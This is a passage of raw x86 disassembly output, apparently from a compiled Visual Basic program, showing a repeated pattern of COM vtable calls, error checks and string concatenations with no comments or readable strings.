  40577f:	ff 90 04 03 00 00    	call   *0x304(%eax)
  405785:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  405788:	50                   	push   %eax
  405789:	51                   	push   %ecx
  40578a:	ff d3                	call   *%ebx
  40578c:	8b f8                	mov    %eax,%edi
  40578e:	8d 45 dc             	lea    -0x24(%ebp),%eax
  405791:	50                   	push   %eax
  405792:	57                   	push   %edi
  405793:	8b 17                	mov    (%edi),%edx
  405795:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  40579b:	85 c0                	test   %eax,%eax
  40579d:	db e2                	fnclex
  40579f:	7d 12                	jge    0x4057b3
  4057a1:	68 a0 00 00 00       	push   $0xa0
  4057a6:	68 b8 24 40 00       	push   $0x4024b8
  4057ab:	57                   	push   %edi
  4057ac:	50                   	push   %eax
  4057ad:	ff 15 28 10 40 00    	call   *0x401028
  4057b3:	8b 55 dc             	mov    -0x24(%ebp),%edx
  4057b6:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  4057bc:	52                   	push   %edx
  4057bd:	68 f4 27 40 00       	push   $0x4027f4
  4057c2:	8b 39                	mov    (%ecx),%edi
  4057c4:	ff 15 20 10 40 00    	call   *0x401020
  4057ca:	8b d0                	mov    %eax,%edx
  4057cc:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4057cf:	ff 15 b8 10 40 00    	call   *0x4010b8
  4057d5:	89 bd 30 fe ff ff    	mov    %edi,-0x1d0(%ebp)
  4057db:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4057e1:	50                   	push   %eax
  4057e2:	8b 85 30 fe ff ff    	mov    -0x1d0(%ebp),%eax
  4057e8:	57                   	push   %edi
  4057e9:	e9 6b df ff ff       	jmp    0x403759
  4057ee:	8b 16                	mov    (%esi),%edx
  4057f0:	56                   	push   %esi
  4057f1:	ff 92 04 03 00 00    	call   *0x304(%edx)
  4057f7:	50                   	push   %eax
  4057f8:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4057fb:	50                   	push   %eax
  4057fc:	ff d3                	call   *%ebx
  4057fe:	8b 0e                	mov    (%esi),%ecx
  405800:	56                   	push   %esi
  405801:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  405807:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  40580d:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  405810:	50                   	push   %eax
  405811:	52                   	push   %edx
  405812:	ff d3                	call   *%ebx
  405814:	8b f8                	mov    %eax,%edi
  405816:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  405819:	51                   	push   %ecx
  40581a:	57                   	push   %edi
  40581b:	8b 07                	mov    (%edi),%eax
  40581d:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  405823:	85 c0                	test   %eax,%eax
  405825:	db e2                	fnclex
  405827:	7d 12                	jge    0x40583b
  405829:	68 a0 00 00 00       	push   $0xa0
  40582e:	68 b8 24 40 00       	push   $0x4024b8
  405833:	57                   	push   %edi
  405834:	50                   	push   %eax
  405835:	ff 15 28 10 40 00    	call   *0x401028
  40583b:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40583e:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  405844:	50                   	push   %eax
  405845:	68 10 28 40 00       	push   $0x402810
  40584a:	8b 3a                	mov    (%edx),%edi
  40584c:	ff 15 20 10 40 00    	call   *0x401020
  405852:	8b d0                	mov    %eax,%edx
  405854:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  405857:	ff 15 b8 10 40 00    	call   *0x4010b8
  40585d:	8b cf                	mov    %edi,%ecx
  40585f:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  405865:	50                   	push   %eax
  405866:	57                   	push   %edi
  405867:	e9 0b 06 00 00       	jmp    0x405e77
  40586c:	8b 06                	mov    (%esi),%eax
  40586e:	56                   	push   %esi
  40586f:	ff 90 04 03 00 00    	call   *0x304(%eax)
  405875:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  405878:	50                   	push   %eax
  405879:	51                   	push   %ecx
  40587a:	ff d3                	call   *%ebx
  40587c:	8b 16                	mov    (%esi),%edx
  40587e:	56                   	push   %esi
  40587f:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  405885:	ff 92 04 03 00 00    	call   *0x304(%edx)
  40588b:	50                   	push   %eax
  40588c:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40588f:	50                   	push   %eax
  405890:	ff d3                	call   *%ebx
  405892:	8b f8                	mov    %eax,%edi
  405894:	8d 55 dc             	lea    -0x24(%ebp),%edx
  405897:	52                   	push   %edx
  405898:	57                   	push   %edi
  405899:	8b 0f                	mov    (%edi),%ecx
  40589b:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  4058a1:	85 c0                	test   %eax,%eax
  4058a3:	db e2                	fnclex
  4058a5:	7d 12                	jge    0x4058b9
  4058a7:	68 a0 00 00 00       	push   $0xa0
  4058ac:	68 b8 24 40 00       	push   $0x4024b8
  4058b1:	57                   	push   %edi
  4058b2:	50                   	push   %eax
  4058b3:	ff 15 28 10 40 00    	call   *0x401028
  4058b9:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4058bc:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  4058c2:	51                   	push   %ecx
  4058c3:	68 28 28 40 00       	push   $0x402828
  4058c8:	8b 38                	mov    (%eax),%edi
  4058ca:	ff 15 20 10 40 00    	call   *0x401020
  4058d0:	8b d0                	mov    %eax,%edx
  4058d2:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4058d5:	ff 15 b8 10 40 00    	call   *0x4010b8
  4058db:	8b d7                	mov    %edi,%edx
  4058dd:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4058e3:	50                   	push   %eax
  4058e4:	57                   	push   %edi
  4058e5:	e9 d7 dd ff ff       	jmp    0x4036c1
  4058ea:	8b 0e                	mov    (%esi),%ecx
  4058ec:	56                   	push   %esi
  4058ed:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  4058f3:	8d 55 d0             	lea    -0x30(%ebp),%edx
  4058f6:	50                   	push   %eax
  4058f7:	52                   	push   %edx
  4058f8:	ff d3                	call   *%ebx
  4058fa:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  405900:	8b 06                	mov    (%esi),%eax
  405902:	56                   	push   %esi
  405903:	ff 90 04 03 00 00    	call   *0x304(%eax)
  405909:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  40590c:	50                   	push   %eax
  40590d:	51                   	push   %ecx
  40590e:	ff d3                	call   *%ebx
  405910:	8b f8                	mov    %eax,%edi
  405912:	8d 45 dc             	lea    -0x24(%ebp),%eax
  405915:	50                   	push   %eax
  405916:	57                   	push   %edi
  405917:	8b 17                	mov    (%edi),%edx
  405919:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  40591f:	85 c0                	test   %eax,%eax
  405921:	db e2                	fnclex
  405923:	7d 12                	jge    0x405937
  405925:	68 a0 00 00 00       	push   $0xa0
  40592a:	68 b8 24 40 00       	push   $0x4024b8
  40592f:	57                   	push   %edi
  405930:	50                   	push   %eax
  405931:	ff 15 28 10 40 00    	call   *0x401028
  405937:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40593a:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  405940:	52                   	push   %edx
  405941:	68 30 28 40 00       	push   $0x402830
  405946:	8b 39                	mov    (%ecx),%edi
  405948:	ff 15 20 10 40 00    	call   *0x401020
  40594e:	8b d0                	mov    %eax,%edx
  405950:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  405953:	ff 15 b8 10 40 00    	call   *0x4010b8
  405959:	89 bd 24 fe ff ff    	mov    %edi,-0x1dc(%ebp)
  40595f:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  405965:	50                   	push   %eax
  405966:	8b 85 24 fe ff ff    	mov    -0x1dc(%ebp),%eax
  40596c:	57                   	push   %edi
  40596d:	e9 e7 dd ff ff       	jmp    0x403759
  405972:	8b 16                	mov    (%esi),%edx
  405974:	56                   	push   %esi
  405975:	ff 92 04 03 00 00    	call   *0x304(%edx)
  40597b:	50                   	push   %eax
  40597c:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40597f:	50                   	push   %eax
  405980:	ff d3                	call   *%ebx
  405982:	8b 0e                	mov    (%esi),%ecx
  405984:	56                   	push   %esi
  405985:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  40598b:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  405991:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  405994:	50                   	push   %eax
  405995:	52                   	push   %edx
  405996:	ff d3                	call   *%ebx
  405998:	8b f8                	mov    %eax,%edi
  40599a:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40599d:	51                   	push   %ecx
  40599e:	57                   	push   %edi
  40599f:	8b 07                	mov    (%edi),%eax
  4059a1:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  4059a7:	85 c0                	test   %eax,%eax
  4059a9:	db e2                	fnclex
  4059ab:	7d 12                	jge    0x4059bf
  4059ad:	68 a0 00 00 00       	push   $0xa0
  4059b2:	68 b8 24 40 00       	push   $0x4024b8
  4059b7:	57                   	push   %edi
  4059b8:	50                   	push   %eax
  4059b9:	ff 15 28 10 40 00    	call   *0x401028
  4059bf:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4059c2:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  4059c8:	50                   	push   %eax
  4059c9:	68 50 28 40 00       	push   $0x402850
  4059ce:	8b 3a                	mov    (%edx),%edi
  4059d0:	ff 15 20 10 40 00    	call   *0x401020
  4059d6:	8b d0                	mov    %eax,%edx
  4059d8:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4059db:	ff 15 b8 10 40 00    	call   *0x4010b8
  4059e1:	8b cf                	mov    %edi,%ecx
  4059e3:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4059e9:	50                   	push   %eax
  4059ea:	57                   	push   %edi
  4059eb:	e9 87 04 00 00       	jmp    0x405e77
  4059f0:	8b 06                	mov    (%esi),%eax
  4059f2:	56                   	push   %esi
  4059f3:	ff 90 04 03 00 00    	call   *0x304(%eax)
  4059f9:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  4059fc:	50                   	push   %eax
  4059fd:	51                   	push   %ecx
  4059fe:	ff d3                	call   *%ebx
  405a00:	8b 16                	mov    (%esi),%edx
  405a02:	56                   	push   %esi
  405a03:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  405a09:	ff 92 04 03 00 00    	call   *0x304(%edx)
  405a0f:	50                   	push   %eax
  405a10:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  405a13:	50                   	push   %eax
  405a14:	ff d3                	call   *%ebx
  405a16:	8b f8                	mov    %eax,%edi
  405a18:	8d 55 dc             	lea    -0x24(%ebp),%edx
  405a1b:	52                   	push   %edx
  405a1c:	57                   	push   %edi
  405a1d:	8b 0f                	mov    (%edi),%ecx
  405a1f:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  405a25:	85 c0                	test   %eax,%eax
  405a27:	db e2                	fnclex
  405a29:	7d 12                	jge    0x405a3d
  405a2b:	68 a0 00 00 00       	push   $0xa0
  405a30:	68 b8 24 40 00       	push   $0x4024b8
  405a35:	57                   	push   %edi
  405a36:	50                   	push   %eax
  405a37:	ff 15 28 10 40 00    	call   *0x401028
  405a3d:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  405a40:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  405a46:	51                   	push   %ecx
  405a47:	68 74 28 40 00       	push   $0x402874
  405a4c:	8b 38                	mov    (%eax),%edi
  405a4e:	ff 15 20 10 40 00    	call   *0x401020
  405a54:	8b d0                	mov    %eax,%edx
  405a56:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  405a59:	ff 15 b8 10 40 00    	call   *0x4010b8
  405a5f:	8b d7                	mov    %edi,%edx
  405a61:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  405a67:	50                   	push   %eax
  405a68:	57                   	push   %edi
  405a69:	e9 53 dc ff ff       	jmp    0x4036c1
  405a6e:	8b 0e                	mov    (%esi),%ecx
  405a70:	56                   	push   %esi
  405a71:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  405a77:	8d 55 d0             	lea    -0x30(%ebp),%edx
  405a7a:	50                   	push   %eax
  405a7b:	52                   	push   %edx
  405a7c:	ff d3                	call   *%ebx
  405a7e:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  405a84:	8b 06                	mov    (%esi),%eax
  405a86:	56                   	push   %esi
  405a87:	ff 90 04 03 00 00    	call   *0x304(%eax)
  405a8d:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  405a90:	50                   	push   %eax
  405a91:	51                   	push   %ecx
  405a92:	ff d3                	call   *%ebx
  405a94:	8b f8                	mov    %eax,%edi
  405a96:	8d 45 dc             	lea    -0x24(%ebp),%eax
  405a99:	50                   	push   %eax
  405a9a:	57                   	push   %edi
  405a9b:	8b 17                	mov    (%edi),%edx
  405a9d:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  405aa3:	85 c0                	test   %eax,%eax
  405aa5:	db e2                	fnclex
  405aa7:	7d 12                	jge    0x405abb
  405aa9:	68 a0 00 00 00       	push   $0xa0
  405aae:	68 b8 24 40 00       	push   $0x4024b8
  405ab3:	57                   	push   %edi
  405ab4:	50                   	push   %eax
  405ab5:	ff 15 28 10 40 00    	call   *0x401028
  405abb:	8b 55 dc             	mov    -0x24(%ebp),%edx
  405abe:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  405ac4:	52                   	push   %edx
  405ac5:	68 8c 28 40 00       	push   $0x40288c
  405aca:	8b 39                	mov    (%ecx),%edi
  405acc:	ff 15 20 10 40 00    	call   *0x401020
  405ad2:	8b d0                	mov    %eax,%edx
  405ad4:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  405ad7:	ff 15 b8 10 40 00    	call   *0x4010b8
  405add:	89 bd 18 fe ff ff    	mov    %edi,-0x1e8(%ebp)
  405ae3:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  405ae9:	50                   	push   %eax
  405aea:	8b 85 18 fe ff ff    	mov    -0x1e8(%ebp),%eax
  405af0:	57                   	push   %edi
  405af1:	e9 63 dc ff ff       	jmp    0x403759
  405af6:	8b 16                	mov    (%esi),%edx
  405af8:	56                   	push   %esi
  405af9:	ff 92 04 03 00 00    	call   *0x304(%edx)
  405aff:	50                   	push   %eax
  405b00:	8d 45 d0             	lea    -0x30(%ebp),%eax
  405b03:	50                   	push   %eax
  405b04:	ff d3                	call   *%ebx
  405b06:	8b 0e                	mov    (%esi),%ecx
  405b08:	56                   	push   %esi
  405b09:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  405b0f:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  405b15:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  405b18:	50                   	push   %eax
  405b19:	52                   	push   %edx
  405b1a:	ff d3                	call   *%ebx
  405b1c:	8b f8                	mov    %eax,%edi
  405b1e:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  405b21:	51                   	push   %ecx
  405b22:	57                   	push   %edi
  405b23:	8b 07                	mov    (%edi),%eax
  405b25:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  405b2b:	85 c0                	test   %eax,%eax
  405b2d:	db e2                	fnclex
  405b2f:	7d 12                	jge    0x405b43
  405b31:	68 a0 00 00 00       	push   $0xa0
  405b36:	68 b8 24 40 00       	push   $0x4024b8
  405b3b:	57                   	push   %edi
  405b3c:	50                   	push   %eax
  405b3d:	ff 15 28 10 40 00    	call   *0x401028
  405b43:	8b 45 dc             	mov    -0x24(%ebp),%eax
  405b46:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  405b4c:	50                   	push   %eax
  405b4d:	68 a8 28 40 00       	push   $0x4028a8
  405b52:	8b 3a                	mov    (%edx),%edi
  405b54:	ff 15 20 10 40 00    	call   *0x401020
  405b5a:	8b d0                	mov    %eax,%edx
  405b5c:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  405b5f:	ff 15 b8 10 40 00    	call   *0x4010b8
  405b65:	8b cf                	mov    %edi,%ecx
  405b67:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  405b6d:	50                   	push   %eax
  405b6e:	57                   	push   %edi
  405b6f:	e9 03 03 00 00       	jmp    0x405e77
  405b74:	8b 06                	mov    (%esi),%eax
  405b76:	56                   	push   %esi
  405b77:	ff 90 04 03 00 00    	call   *0x304(%eax)
  405b7d:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  405b80:	50                   	push   %eax
  405b81:	51                   	push   %ecx
  405b82:	ff d3                	call   *%ebx
  405b84:	8b 16                	mov    (%esi),%edx
  405b86:	56                   	push   %esi
  405b87:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  405b8d:	ff 92 04 03 00 00    	call   *0x304(%edx)
  405b93:	50                   	push   %eax
  405b94:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  405b97:	50                   	push   %eax
  405b98:	ff d3                	call   *%ebx
  405b9a:	8b f8                	mov    %eax,%edi
  405b9c:	8d 55 dc             	lea    -0x24(%ebp),%edx
  405b9f:	52                   	push   %edx
  405ba0:	57                   	push   %edi
  405ba1:	8b 0f                	mov    (%edi),%ecx
  405ba3:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  405ba9:	85 c0                	test   %eax,%eax
  405bab:	db e2                	fnclex
  405bad:	7d 12                	jge    0x405bc1
  405baf:	68 a0 00 00 00       	push   $0xa0
  405bb4:	68 b8 24 40 00       	push   $0x4024b8
  405bb9:	57                   	push   %edi
  405bba:	50                   	push   %eax
  405bbb:	ff 15 28 10 40 00    	call   *0x401028
  405bc1:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  405bc4:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  405bca:	51                   	push   %ecx
  405bcb:	68 c4 28 40 00       	push   $0x4028c4
  405bd0:	8b 38                	mov    (%eax),%edi
  405bd2:	ff 15 20 10 40 00    	call   *0x401020
  405bd8:	8b d0                	mov    %eax,%edx
  405bda:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  405bdd:	ff 15 b8 10 40 00    	call   *0x4010b8
  405be3:	8b d7                	mov    %edi,%edx
  405be5:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  405beb:	50                   	push   %eax
  405bec:	57                   	push   %edi
  405bed:	e9 cf da ff ff       	jmp    0x4036c1
  405bf2:	8b 0e                	mov    (%esi),%ecx
  405bf4:	56                   	push   %esi
  405bf5:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  405bfb:	8d 55 d0             	lea    -0x30(%ebp),%edx
  405bfe:	50                   	push   %eax
  405bff:	52                   	push   %edx
  405c00:	ff d3                	call   *%ebx
  405c02:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  405c08:	8b 06                	mov    (%esi),%eax
  405c0a:	56                   	push   %esi
  405c0b:	ff 90 04 03 00 00    	call   *0x304(%eax)
  405c11:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  405c14:	50                   	push   %eax
  405c15:	51                   	push   %ecx
  405c16:	ff d3                	call   *%ebx
  405c18:	8b f8                	mov    %eax,%edi
  405c1a:	8d 45 dc             	lea    -0x24(%ebp),%eax
  405c1d:	50                   	push   %eax
  405c1e:	57                   	push   %edi
  405c1f:	8b 17                	mov    (%edi),%edx
  405c21:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  405c27:	85 c0                	test   %eax,%eax
  405c29:	db e2                	fnclex
  405c2b:	7d 12                	jge    0x405c3f
  405c2d:	68 a0 00 00 00       	push   $0xa0
  405c32:	68 b8 24 40 00       	push   $0x4024b8
  405c37:	57                   	push   %edi
  405c38:	50                   	push   %eax
  405c39:	ff 15 28 10 40 00    	call   *0x401028
  405c3f:	8b 55 dc             	mov    -0x24(%ebp),%edx
  405c42:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  405c48:	52                   	push   %edx
  405c49:	68 dc 28 40 00       	push   $0x4028dc
  405c4e:	8b 39                	mov    (%ecx),%edi
  405c50:	ff 15 20 10 40 00    	call   *0x401020
  405c56:	8b d0                	mov    %eax,%edx
  405c58:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  405c5b:	ff 15 b8 10 40 00    	call   *0x4010b8
  405c61:	89 bd 0c fe ff ff    	mov    %edi,-0x1f4(%ebp)
  405c67:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  405c6d:	50                   	push   %eax
  405c6e:	8b 85 0c fe ff ff    	mov    -0x1f4(%ebp),%eax
  405c74:	57                   	push   %edi
  405c75:	e9 df da ff ff       	jmp    0x403759
  405c7a:	8b 16                	mov    (%esi),%edx
  405c7c:	56                   	push   %esi
  405c7d:	ff 92 04 03 00 00    	call   *0x304(%edx)
  405c83:	50                   	push   %eax
  405c84:	8d 45 d0             	lea    -0x30(%ebp),%eax
  405c87:	50                   	push   %eax
  405c88:	ff d3                	call   *%ebx
  405c8a:	8b 0e                	mov    (%esi),%ecx
  405c8c:	56                   	push   %esi
  405c8d:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  405c93:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  405c99:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  405c9c:	50                   	push   %eax
  405c9d:	52                   	push   %edx
  405c9e:	ff d3                	call   *%ebx
  405ca0:	8b f8                	mov    %eax,%edi
  405ca2:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  405ca5:	51                   	push   %ecx
  405ca6:	57                   	push   %edi
  405ca7:	8b 07                	mov    (%edi),%eax
  405ca9:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  405caf:	85 c0                	test   %eax,%eax
  405cb1:	db e2                	fnclex
  405cb3:	7d 12                	jge    0x405cc7
  405cb5:	68 a0 00 00 00       	push   $0xa0
  405cba:	68 b8 24 40 00       	push   $0x4024b8
  405cbf:	57                   	push   %edi
  405cc0:	50                   	push   %eax
  405cc1:	ff 15 28 10 40 00    	call   *0x401028
  405cc7:	8b 45 dc             	mov    -0x24(%ebp),%eax
  405cca:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  405cd0:	50                   	push   %eax
  405cd1:	68 f8 28 40 00       	push   $0x4028f8
  405cd6:	8b 3a                	mov    (%edx),%edi
  405cd8:	ff 15 20 10 40 00    	call   *0x401020
  405cde:	8b d0                	mov    %eax,%edx
  405ce0:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  405ce3:	ff 15 b8 10 40 00    	call   *0x4010b8
  405ce9:	8b cf                	mov    %edi,%ecx
  405ceb:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  405cf1:	50                   	push   %eax
  405cf2:	57                   	push   %edi
  405cf3:	e9 7f 01 00 00       	jmp    0x405e77
  405cf8:	8b 06                	mov    (%esi),%eax
  405cfa:	56                   	push   %esi
  405cfb:	ff 90 04 03 00 00    	call   *0x304(%eax)
  405d01:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  405d04:	50                   	push   %eax
  405d05:	51                   	push   %ecx
  405d06:	ff d3                	call   *%ebx
  405d08:	8b 16                	mov    (%esi),%edx
  405d0a:	56                   	push   %esi
  405d0b:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  405d11:	ff 92 04 03 00 00    	call   *0x304(%edx)
  405d17:	50                   	push   %eax
  405d18:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  405d1b:	50                   	push   %eax
  405d1c:	ff d3                	call   *%ebx
  405d1e:	8b f8                	mov    %eax,%edi
  405d20:	8d 55 dc             	lea    -0x24(%ebp),%edx
  405d23:	52                   	push   %edx
  405d24:	57                   	push   %edi
  405d25:	8b 0f                	mov    (%edi),%ecx
  405d27:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  405d2d:	85 c0                	test   %eax,%eax
  405d2f:	db e2                	fnclex
  405d31:	7d 12                	jge    0x405d45
  405d33:	68 a0 00 00 00       	push   $0xa0
  405d38:	68 b8 24 40 00       	push   $0x4024b8
  405d3d:	57                   	push   %edi
  405d3e:	50                   	push   %eax
  405d3f:	ff 15 28 10 40 00    	call   *0x401028
  405d45:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  405d48:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  405d4e:	51                   	push   %ecx
  405d4f:	68 14 29 40 00       	push   $0x402914
  405d54:	8b 38                	mov    (%eax),%edi
  405d56:	ff 15 20 10 40 00    	call   *0x401020
  405d5c:	8b d0                	mov    %eax,%edx
  405d5e:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  405d61:	ff 15 b8 10 40 00    	call   *0x4010b8
  405d67:	8b d7                	mov    %edi,%edx
  405d69:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  405d6f:	50                   	push   %eax
  405d70:	57                   	push   %edi
  405d71:	e9 4b d9 ff ff       	jmp    0x4036c1
  405d76:	8b 0e                	mov    (%esi),%ecx
  405d78:	56                   	push   %esi
  405d79:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  405d7f:	8d 55 d0             	lea    -0x30(%ebp),%edx
  405d82:	50                   	push   %eax
  405d83:	52                   	push   %edx
  405d84:	ff d3                	call   *%ebx
  405d86:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  405d8c:	8b 06                	mov    (%esi),%eax
  405d8e:	56                   	push   %esi
  405d8f:	ff 90 04 03 00 00    	call   *0x304(%eax)
  405d95:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  405d98:	50                   	push   %eax
  405d99:	51                   	push   %ecx
  405d9a:	ff d3                	call   *%ebx
  405d9c:	8b f8                	mov    %eax,%edi
  405d9e:	8d 45 dc             	lea    -0x24(%ebp),%eax
  405da1:	50                   	push   %eax
  405da2:	57                   	push   %edi
  405da3:	8b 17                	mov    (%edi),%edx
  405da5:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  405dab:	85 c0                	test   %eax,%eax
  405dad:	db e2                	fnclex
  405daf:	7d 12                	jge    0x405dc3
  405db1:	68 a0 00 00 00       	push   $0xa0
  405db6:	68 b8 24 40 00       	push   $0x4024b8
  405dbb:	57                   	push   %edi
  405dbc:	50                   	push   %eax
  405dbd:	ff 15 28 10 40 00    	call   *0x401028
  405dc3:	8b 55 dc             	mov    -0x24(%ebp),%edx
  405dc6:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  405dcc:	52                   	push   %edx
  405dcd:	68 4c 29 40 00       	push   $0x40294c
  405dd2:	8b 39                	mov    (%ecx),%edi
  405dd4:	ff 15 20 10 40 00    	call   *0x401020
  405dda:	8b d0                	mov    %eax,%edx
  405ddc:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  405ddf:	ff 15 b8 10 40 00    	call   *0x4010b8
  405de5:	89 bd 00 fe ff ff    	mov    %edi,-0x200(%ebp)
  405deb:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  405df1:	50                   	push   %eax
  405df2:	8b 85 00 fe ff ff    	mov    -0x200(%ebp),%eax
  405df8:	57                   	push   %edi
  405df9:	e9 5b d9 ff ff       	jmp    0x403759
  405dfe:	8b 16                	mov    (%esi),%edx
  405e00:	56                   	push   %esi
  405e01:	ff 92 04 03 00 00    	call   *0x304(%edx)
  405e07:	50                   	push   %eax
  405e08:	8d 45 d0             	lea    -0x30(%ebp),%eax
  405e0b:	50                   	push   %eax
  405e0c:	ff d3                	call   *%ebx
  405e0e:	8b 0e                	mov    (%esi),%ecx
  405e10:	56                   	push   %esi
  405e11:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  405e17:	ff 91 04 03 00 00    	call   *0x304(%ecx)
  405e1d:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  405e20:	50                   	push   %eax
  405e21:	52                   	push   %edx
  405e22:	ff d3                	call   *%ebx
  405e24:	8b f8                	mov    %eax,%edi
  405e26:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  405e29:	51                   	push   %ecx
  405e2a:	57                   	push   %edi
  405e2b:	8b 07                	mov    (%edi),%eax
  405e2d:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  405e33:	85 c0                	test   %eax,%eax
  405e35:	db e2                	fnclex
  405e37:	7d 12                	jge    0x405e4b
  405e39:	68 a0 00 00 00       	push   $0xa0
  405e3e:	68 b8 24 40 00       	push   $0x4024b8
  405e43:	57                   	push   %edi
  405e44:	50                   	push   %eax
  405e45:	ff 15 28 10 40 00    	call   *0x401028
  405e4b:	8b 45 dc             	mov    -0x24(%ebp),%eax
  405e4e:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  405e54:	50                   	push   %eax
  405e55:	68 68 29 40 00       	push   $0x402968
  405e5a:	8b 3a                	mov    (%edx),%edi
  405e5c:	ff 15 20 10 40 00    	call   *0x401020
  405e62:	8b d0                	mov    %eax,%edx
  405e64:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  405e67:	ff 15 b8 10 40 00    	call   *0x4010b8
  405e6d:	8b cf                	mov    %edi,%ecx
  405e6f:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  405e75:	50                   	push   %eax
  405e76:	57                   	push   %edi
  405e77:	ff 91 a4 00 00 00    	call   *0xa4(%ecx)
  405e7d:	85 c0                	test   %eax,%eax
